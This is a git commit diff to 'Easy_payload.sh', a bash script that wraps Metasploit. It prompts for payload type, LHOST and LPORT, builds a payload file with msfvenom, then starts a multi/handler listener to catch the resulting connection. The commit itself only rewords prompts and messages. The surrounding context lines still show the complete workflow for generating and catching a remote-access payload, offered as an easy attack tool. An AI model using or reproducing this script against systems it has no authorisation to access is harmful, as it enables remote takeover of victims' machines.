b4996525213ed44ec6295cfd08d13e734a982e0f
THE KILLER <61799087+ramizeyrii@users.noreply.github.com>
2022-04-02 10:52:49 +0100

    Update Easy_payload.sh

--- Easy_payload.sh
+++ Easy_payload.sh
@@ -12,14 +12,14 @@ Fiuscha="\033[0;35m"
 blue="\033[1;34m"
 nc="\e[0m"
 figlet PAYLOAD
-echo -e "$green thank you for use my new tool        $red -_RAMI_ZEYRI_- $yellow"
+echo -e "$green thank you for using my tool        $red -_RAMI_ZEYRI_- $yellow"
 echo "pleas wait a few seconds............/"
 sleep 3
-read -p "type of your payload : " plod
-read -p "name of your payload : " payload
-read -p "format file : " format
-read -p "Lhost : " host
-read -p "Lport : " port
+read -p "Type   : " plod
+read -p "Name   : " payload
+read -p "Format : " format
+read -p "Lhost  : " host
+read -p "Lport  : " port
 echo "pleas wait a few secands............/"
 sleep 3
 xterm -e "msfvenom -p $plod Lhost=$host Lport=$port R> /root/Desktop/$payload.$format"
@@ -27,5 +27,5 @@ function metasploit {
 msfconsole -q -x "use multi/handler -p $plod -H $host -p $port -r run"
 }
 metasploit
-echo -e "$green Returen again <3"
+echo -e "$green Thank you !!"
 
